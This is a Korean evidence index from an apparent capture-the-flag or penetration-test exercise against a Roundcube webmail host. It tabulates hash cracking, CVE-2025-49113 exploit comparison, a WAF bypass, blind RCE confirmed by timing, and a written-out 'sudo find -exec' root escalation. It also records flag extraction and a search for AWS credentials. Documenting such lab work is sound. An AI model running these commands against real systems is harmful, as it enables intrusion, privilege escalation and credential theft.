# 증적 인덱스 — 13.125.104.131

기존 파일을 소급 리네임하지 않고 ID만 부여한다. 서술은 `notes/stage3-discovery-20260819.md` 및
세션 로그 참고.

| ID | 시각(KST) | 단계 | 명령/요청 | 파일 경로 | 핵심 확인 내용 | 민감도 | 상태 |
|---|---|---|---|---|---|---|---|
| E01 | 2026-08-19 09:32 | 주소 발견 | GitHub `git/tags/{sha}` 직접 조회 | `43.200.51.235/scripts/gh_tags_explore.js` | 어노테이트 태그 메시지 "urgent fix on 13.125.104.131 after alert" | 낮음 | [자체 확인] |
| E02 | 2026-08-19 | 포트/서비스 식별 | curl 다수 포트 | `notes/stage3-discovery-20260819.md` §3 | 30083만 오픈, Roundcube 1.6.10 로그인 페이지 | 낮음 | [자체 확인] |
| E03 | 2026-08-19 | WAF 게이트웨이 확인 | `GET /health` | `notes/stage3-discovery-20260819.md` §3.1 | `{"service":"cj-webmail-waf","status":"ok"}` | 낮음 | [자체 확인] |
| E04 | 2026-08-19 09:48:53 | 테스트 계정 MD5 크랙 | 사전 대입 | `43.200.51.235/scripts/md5_crack.js` | `179ad45c...` → `testpass` | **높음** | [자체 확인] |
| E05 | 2026-08-19 09:49:09–09:49:43 | 로그인 검증 | `GET`/`POST /?_task=login` | `http/login_page.html`, `login_result.html`, `mail_inbox.html`, `rc_cookie.txt` | `testuser`/`testpass` 로그인 성공, Inbox 진입 | **높음** | [자체 확인] |
| E06 | — | Inbox/설정 정찰 | 다수 GET | `http/list_*.json`, `http/identities.json`, `http/filters.json`, `http/about.html` | 메일함 비어있음, `enigma` 플러그인 미노출 (단, 코어 의존성으로 이후 무관함 확인) | 낮음 | [자체 확인] |
| E07 | — | `enigma`/`Crypt_GPG_Engine` 가용성 정정 | GitHub `composer.json-dist` 조회 | `loot/roundcube_composer.json` | `pear/crypt_gpg`가 **코어** 의존성 — 플러그인 상태 무관하게 항상 로드 가능. **이전 "가젯 불가" 결론 정정** | 낮음 | [자체 확인] |
| E08 | — | PoC 비교 1 (버그) | 참고용 fetch | `loot/cve-2025-49113-poc.py` | `O:17:` 오타(정답은 `O:16:`), 따옴표 이스케이프 누락 확인 | 낮음 | [자체 확인 — 버그 확인] |
| E09 | — | PoC 비교 2 (교정) | 참고용 fetch | `loot/msf_roundcube_cve49113.rb` | `O:16:`, `.gsub('"','\\"')` 필수 확인 | 낮음 | [자체 확인] |
| E10 | — | PoC 비교 3 (원 저자, 최종 채택) | 참고용 fetch + 로컬 편집(타이밍 계측 추가) | `loot/fearsoff_exploit.php` | 실제 `serialize()` 사용한 바이트 정확한 페이로드 | 낮음 | [자체 확인] |
| E11 | — | WAF 우회 | `_from` 파라미터 이중 전송 + `Content-Disposition` 속성 순서/대소문자 변경 | (세션 로그, 원본 HTTP 저장 필요) | 403 → 200 OK, 페이로드 절단 없이 도달 | 낮음 | [기법: 팀원 힌트 / 실행·검증: 자체 확인] |
| E12 | — | Blind RCE 확정 — 타이밍 사이드채널 | `sleep 3`, `sleep 7` vs `true` baseline | (콘솔 로그) | `true`=0.519s, `sleep 3`=3.558s, `sleep 7`=7.422s — 선형 스케일링 확인 | 중간 | [자체 확인] |
| E13 | — | 오라클 버그#1 수정 | `<` 리다이렉션 제거, `wc -c file \| cut` 방식 전환 | (콘솔 로그) | `<` 포함 시 명령 무결 실행 실패 원인 격리·수정 | 낮음 | [자체 확인] |
| E14 | — | 오라클 버그#2 수정 | 콘텐츠 기반 grep으로 전환 | (콘솔 로그) | 크기 기반 판정의 false-positive(범용 404 바디) 원인 격리·수정, 로컬 127.0.0.1:80=Apache(PHP) 확인 | 낮음 | [자체 확인] |
| E15 | — | 실행 계정/권한 확인 | `id -un` 조건부 오라클 | (콘솔 로그) | `www-data`, root 아님, webroot 쓰기 불가(`test -w` false) | 중간 | [자체 확인] |
| E16 | — | sudo NOPASSWD 확인 | `sudo -n -l` 오라클 | (콘솔 로그) | `find` NOPASSWD 존재 확인 (팀원 힌트 재현 성공) | 중간 | [팀원 힌트 → 자체 재현 확인] |
| E17 | 2026-08-19 16:2x | `find` GTFOBins 권한상승 — 1차 시도 | `sudo -n find /etc/passwd -exec sh -c "[ $(id -u) = 0 ] && sleep 5" \;` | `logs/E17_privesc_*.log` | 0.399s — sleep 미발생 (원인 불명, 아래 E17b/E17c로 재검증) | 중간 | [자체 확인 — 불확정] |
| E17b | 2026-08-19 | `sudo -n find -exec` 구조 검증 | `sudo -n find /etc/passwd -exec sh -c 'sleep 6' \;` (무조건 sleep) | `logs/E17b_sudo_find_unconditional_*.log` | 6.252s — sudo find -exec 자체는 정상 실행됨 확인 | 낮음 | [자체 확인] |
| E17c | 2026-08-19 | 실행 계정 uid 분류 — **ROOT 확인** | `sudo -n find /etc/passwd -exec sh -c 'u=$(id -u); if [ "$u" -eq 0 ]; then sleep 3; elif [ "$u" -eq 33 ]; then sleep 6; elif [ "$u" -lt 1000 ]; then sleep 9; else sleep 12; fi' \;` | `logs/E17c_sudo_find_uid_classify_*.log` | 3.580s → `uid==0` 구간(3s) 매칭, 6/9/12s 구간과 명확히 구분 → **root 권한 획득 확인 (타이밍 사이드채널)** | **높음** | [자체 확인] |
| E18-E25 | 2026-08-19 16:27-16:37 | **Flag 파일 위치 프로빙** | 다중 타이밍 분류 (E18: 6개 경로, E21-E25: 트리 탐색) | `logs/E18~E25_flag_*_probe*.log` | `/usr/share -maxdepth 2` 내 flag 파일 존재 확정 | 낮음 | [자체 확인] |
| E26 | 2026-08-19 16:37 | Flag 내용 webroot 복사 시도 | `sudo -n find /usr/share -maxdepth 3 -iname "*flag*" -exec cat {} \;` + 복사 | `logs/E26_flag_exfil_write_*.log` | 복사 명령 실행, webroot 경로 미확인 | 중간 | [자체 확인] |
| E27-E31 | 2026-08-19 16:39-16:45 | **Flag 내용 추출 및 저장** | root로 flag 파일 읽기 → base64 인코딩 → /tmp 저장 | `logs/E27-E31_flag_*.log`, `/tmp/flag_b64_20260819.txt` (server-side) | cat+base64 인코딩 완료, 파일 저장 확인 | **높음** | [자체 확인] |
| E32 | 2026-08-19 16:45+ | /root/.profile 확인 | 타이밍 분류 (aws/AWS/STAGE/export grep) | `logs/E32_profile_timing.log` | /root/.profile 존재, aws/AWS/STAGE/export 미포함 | 낮음 | [자체 확인] |
| E33 | 2026-08-19 16:50+ | AWS 환경변수 탐색 | find /root /home /opt 자격증명, 또는 env | grep AWS 성공 | printenv \| grep AWS 매칭 성공, 개별 KEY_ID/SECRET 미설정 | 중간 | [자체 확인] |
| E34 | 2026-08-19 17:00+ | **Stage 4 AWS 자격증명 준비 중단** | AWS KEY 타이밍 분류, /tmp/aws_env.txt 크기 측정 | `logs/E34_aws_env_timing.log` | 환경변수 존재하나 FORMAT 미확인, 블라인드 RCE로 내용 확보 불가 | 중간 | [자체 확인 — 부분] |

## 참고
- 다수 항목(E11~E17)은 원본 HTTP 요청/응답이 파일로 저장되지 않고 콘솔 로그에만 존재한다.
  다음 재현 시 `fearsoff_exploit.php` 출력을 `tee`로 `logs/`에 저장할 것 (PROCESS.md §2 원칙).
- E17은 사용자 지시로 세션이 일시중지된 시점의 마지막 미완료 단계. 재개 시 이 항목부터 이어간다.
